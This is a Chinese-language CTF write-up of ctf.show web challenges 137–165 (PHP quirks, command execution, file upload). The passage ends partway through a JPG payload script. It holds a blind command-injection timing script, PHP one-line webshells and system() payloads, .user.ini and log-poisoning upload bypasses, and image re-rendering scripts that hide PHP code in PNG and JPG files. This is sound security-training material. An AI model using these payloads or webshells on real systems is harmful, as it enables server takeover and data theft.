<h3 id="web-137"><a href="#web-137" class="headerlink" title="web 137"></a>web 137</h3><p>讲到调用call_user_func的方法以及-&gt;跟::调用类中成员的方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">用于动态语境处理某个类的某个实例</span></span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure>

<p>也就是说::可以不用实例就能调用类的静态方法</p>
<h3 id="web-138"><a href="#web-138" class="headerlink" title="web 138"></a>web 138</h3><p>call_user_func可以传入数组</p>
<p>如果传入的数组是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">call_user_func(array($</span><span class="bash">classname,<span class="string">&#x27;function1&#x27;</span>))</span></span><br><span class="line">这个时候他就会直接调用classname类中的function1方法</span><br></pre></td></tr></table></figure>

<h3 id="web-139"><a href="#web-139" class="headerlink" title="web 139"></a>web 139</h3><p>跟136的代码一模一样，但是不能写文件，所以上面的方法不能用了，需要另外找一个方法：文件盲打</p>
<p>因为没有过滤sleep所以可以进行盲打</p>
<p>原理：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls / -1  #将根目录文件一行一个表示</span><br><span class="line">awk &#x27;NR==1&#x27; #截取第一行</span><br><span class="line">cut -c 1 #截取当前文件名的第一个字符</span><br></pre></td></tr></table></figure>

<p>将我们分割的文件对字母遍历，如果正确就设置一个sleep，如果正确执行则返回</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web139_1.png" alt="1"></p>
<p>我们对这个进行一个判断：</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web139_2.png" alt="1"></p>
<p>附上payload脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;+++++++++++&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://33f5eb0a-181b-4cbf-8014-74a54f04a425.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ctfshowabdegijklmnpqrtuvxyz-&#123;&#125;0123456789&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,5):</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            <span class="comment">#payload = &#x27;if [ `ls / -1 | cut -c %d | awk &quot;NR==4&quot; ` == &quot;%s&quot; ];then sleep 4;fi&#x27; % (j,m)   #f149_15_h3r3</span></span><br><span class="line">            payload = <span class="string">&#x27;if [ `cat /f149_15_h3r3 |cut -c %d ` == &quot;%s&quot; ];then sleep 4;fi&#x27;</span> %(j,m)</span><br><span class="line">            target = url + payload</span><br><span class="line">            <span class="comment">#print(target)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = requests.get(target,timeout=(<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result += m</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="web-140"><a href="#web-140" class="headerlink" title="web 140"></a>web 140</h3><p>松散比较==:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0==&#x27;ctfshow&#x27;为真（8.0.0之后为假）</span><br><span class="line">所以我们需要$code为0</span><br><span class="line">也就是说我们只需要一个没有返回值的函数拼接就行了</span><br><span class="line">官方：usleep</span><br><span class="line">也可以使用两个system或者sleep什么的</span><br></pre></td></tr></table></figure>

<h3 id="web-141"><a href="#web-141" class="headerlink" title="web 141"></a>web 141</h3><p>url编码的构造形式：但字符串的ascii吗16进制前加%</p>
<p>用^构造出我们需要的字符，但是如何执行呢</p>
<p>构造异或之前写过，可以去翻翻</p>
<p><code>特性：运算符中间含有语句的时候可以一样执行</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">1+phpinfo()+1</span><br><span class="line">其中的phpinfo会一样执行</span><br></pre></td></tr></table></figure>

<h3 id="web-142"><a href="#web-142" class="headerlink" title="web 142"></a>web 142</h3><p>数字构造，直接构造0e在转换成int的时候会被判断为0，（—好像直接是0也可以—）</p>
<h3 id="web-143"><a href="#web-143" class="headerlink" title="web 143"></a>web 143</h3><p>无字符RCE：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strr = &#x27;`!@#\^*=&quot;\&#x27;()[],/&lt;&gt;?:&#x27;</span><br><span class="line"></span><br><span class="line">for i in strr:</span><br><span class="line">    for j in strr:</span><br><span class="line">        for m in strr:</span><br><span class="line">            print(chr(ord(i)^ord(j)^ord(m)) +&#x27;=%&#x27;  + str(hex(ord(i)))[2:]  +&#x27;^%&#x27; +str(hex(ord(j)))[2:] + &#x27;^%&#x27; + str(hex(ord(m))))[2:]</span><br></pre></td></tr></table></figure>

<p>然后拼凑就好了</p>
<h3 id="web-144"><a href="#web-144" class="headerlink" title="web 144"></a>web 144</h3><p>过滤从V3变成了V2但是对V2的过滤消失了，所以我们可以把刚刚v3的payload放到v2，然后v3的长度要等于1直接构造<code>1-v2</code>就行了</p>
<h3 id="web-145"><a href="#web-145" class="headerlink" title="web 145"></a>web 145</h3><p>三目运算符的妙用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return 1?phpinfo():1;</span><br><span class="line">执行phpinfo（）</span><br></pre></td></tr></table></figure>

<h3 id="web-146"><a href="#web-146" class="headerlink" title="web 146"></a>web 146</h3><p>增加了：过滤，可以用等号然后||绕过</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1&quot;);</span><br></pre></td></tr></table></figure>

<p>也会执行phpinfo</p>
<h3 id="web-147"><a href="#web-147" class="headerlink" title="web 147"></a>web 147</h3><p>使用创建函数<code>/create_function</code>前面添加/作用不仅是绕过，这是默认的命名空间，所有原生类以及函数都在这里，我们调用函数的时候其实是调用了一个相对路径的函数命，如果前面添加了一个/那么我们再调用函数的时候我们就必须加上/使用它的相对路径；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function()用法</span><br><span class="line"><span class="meta">$</span><span class="bash">a = create_function(<span class="string">&#x27;$b&#x27;</span>,<span class="string">&#x27;return 1;&#x27;</span>)相当于</span></span><br><span class="line">function $a($b)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们直接构造</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:ctf=create_function()</span><br><span class="line">get:show=;&#125;system(&#x27;tac f*&#x27;);##首先先闭合这个函数然后添加我们需要的代码,最后把后面的那个&#125;注释</span><br></pre></td></tr></table></figure>

<h3 id="web-148"><a href="#web-148" class="headerlink" title="web 148"></a>web 148</h3><p>可以直接使用上面的^拼凑，过滤换一下就行</p>
<p>wp是直接用上面的那些构造_GET然后用中文作为变量名，进行变量替换执行函数；</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[嘿](<span class="variable">$&#123;$哈&#125;</span>[呜]);&amp;嘿=system&amp;呜=cat%20flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web-149"><a href="#web-149" class="headerlink" title="web 149"></a>web 149</h3><p>题目会将除了index.php文件意外的所有文件都删除（当前目录下），但是它中间给我们留了一行文件写入，我们可以直接在index.php文件中写入一句话木马。</p>
<p>payload:<br><code>get:ctf=index.php post:show=&lt;?php eval($_POST[1]); ?&gt;</code></p>
<h3 id="web-150"><a href="#web-150" class="headerlink" title="web 150"></a>web 150</h3><p>这个题目里面对文件包含的这个ctf完全的没有做什么过滤只是<code>：</code>过滤不能使用任何协议。</p>
<p>所以我们可以直接写入日志文件，写入一个一句话木马，然后包含日志文件直接RCE，先得测试一下看看网站时什么服务器，在页面后面随便乱写一些页面，可以看到是nginx服务器，而他的一般日志文件在/var/log/nginx/access.log文件夹下，我们直接提前先写一个文件修改一个user-agent写一个一句话木马，然后包含日志文件最后RCE</p>
<h3 id="web-150-plus"><a href="#web-150-plus" class="headerlink" title="web 150_plus"></a>web 150_plus</h3><p>对上面的方法进行了过滤，ctf里面不能包含log得换一个办法，有一说一这个题目有一个缩进问题，导致容易看错，其实下面的function __autoload是独立出来不包含在类里面的，这种魔术方法 在试图使用当前脚本中尚未被定义的类时自动调用，可以看到下面没有回显所以<code>$__CTFSHOW__</code>这个变量是没有被创建的，但是上面的<code>extract($_GET);</code>可以进行变量覆盖必须得跟<code>$__CTFSHOW__</code>不同，所以得使用特性</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格   +    [    .   在变量中会被替换成下划线</span><br><span class="line">[之后的上述符号是不会被替换成下划线的</span><br><span class="line">所以我们构造变量覆盖可以构造..CTFSHOW..它就会被解析成__CTFSHOW__既不会进下面的if又可以进行覆盖进入上面的魔术方法，经过魔术方法返回之后可以将其变成函数，构造成</span><br><span class="line"><span class="meta">#</span><span class="bash">函数名（）;</span></span><br><span class="line">这种语句，直接输入phpinfo就可以执行phpinfo()</span><br><span class="line">flag包含在phpinfo里面</span><br></pre></td></tr></table></figure>

<h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-151"><a href="#web-151" class="headerlink" title="web 151"></a>web 151</h3><p>过滤卸载了前端，直接修改前端代码，png改成php直接上传一句话木马</p>
<h3 id="web-152"><a href="#web-152" class="headerlink" title="web 152"></a>web 152</h3><p>除去前端的过滤后端也有过滤，但是只过滤了他的后缀格式，我们创建一句话将其改成png后缀发送过去之后抓包，抓到后修改格式就可以成功执行</p>
<h3 id="web-153"><a href="#web-153" class="headerlink" title="web 153"></a>web 153</h3><p>同样是抓包修改，但是出现一个问题，php修改后缀之后是无法直接用的，那么我们只能上传图片，然后在上传文件修改服务器的配置文件，让其中的文件改成php语言或者是包含这个文件让其执行。</p>
<p>对apache服务器来说是上传.htaccess文件构造上传，将我们上传的图片文件解析成php语言然后访问执行，如果是nginx服务器的话则是.user.ini配置文件，而且这个条件非常苛刻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用.user.ini</span><br></pre></td></tr></table></figure>

<p>题目里面开启了，所以可以用，有两个参数可以设置包含<code>auto_prepend_file</code>还有<code>auto_append_file</code>这只一个指定文件相当于使用了包含，文件将其内容包含在了php文件中,而这两个函数的区别则是一个是在文件之前插入一个实在文件之后插入，后者在插入的时候入宫文件结尾有exit（）则无法触发。</p>
<p>举个例子：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.user.ini</span><br><span class="line"></span><br><span class="line">GIF98a</span><br><span class="line">autp_prepend_file=1.jpg</span><br><span class="line"></span><br><span class="line">1.jpg</span><br><span class="line"></span><br><span class="line">GIF98a</span><br><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>GIF98a是一种图形交换格式（GIF）98a版（有时可以绕过检测）</p>
<p>这样他就会被包含在upload里面的index.php文件里面）</p>
<h3 id="web-154"><a href="#web-154" class="headerlink" title="web 154"></a>web 154</h3><p>对文件内容加了一层过滤，文件内容不能出现php用<code>&lt;?=</code>代替<code>&lt;?php</code>即可</p>
<h3 id="web-155"><a href="#web-155" class="headerlink" title="web 155"></a>web 155</h3><p>上面也可以</p>
<h3 id="web-156"><a href="#web-156" class="headerlink" title="web 156"></a>web 156</h3><p>过滤了<code>[]</code></p>
<p>可以直接在文件中调用system函数直接回显</p>
<h3 id="web-157"><a href="#web-157" class="headerlink" title="web 157"></a>web 157</h3><p>过滤了分号，因为在末尾直接删除即可</p>
<h3 id="web-158"><a href="#web-158" class="headerlink" title="web 158"></a>web 158</h3><p>不知道添加了啥，上一把的可以直接用</p>
<h3 id="web-159"><a href="#web-159" class="headerlink" title="web 159"></a>web 159</h3><p>system被ban了，用反引号闭合代替</p>
<h3 id="web-160"><a href="#web-160" class="headerlink" title="web 160"></a>web 160</h3><p>反引号被ban，可以使用包含日志文件，因为此服务器是nginx所以日志一般在/var/log/nginx/access.log</p>
<p>括号也被ban所以直接用双引号包裹就行，最后输入进去的时候发现还是不行，测试了一下因为log这边不能在一块，可以分割开来用<code>.</code></p>
<p>链接</p>
<h3 id="web-161"><a href="#web-161" class="headerlink" title="web 161"></a>web 161</h3><p>多了一层对图片识别的过滤，因为我们一直都有加GIF98a所以可以直接过</p>
<h3 id="web-162-163"><a href="#web-162-163" class="headerlink" title="web 162-163"></a>web 162-163</h3><p>条件竞争，环境做不了</p>
<h3 id="web-164"><a href="#web-164" class="headerlink" title="web 164"></a>web 164</h3><p>图片的二次渲染绕过：摘录一下wu名大佬的脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>zui后生成的脚本就是<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code></p>
<p>将这个文件上传上去就可以进行rce了</p>
<h3 id="web-165"><a href="#web-165" class="headerlink" title="web 165"></a>web 165</h3><p>上一题是png二次渲染，这一条是jpg二次渲染，类型差不多，只不过jpg渲染比较繁琐，脚本也比较长，附上脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        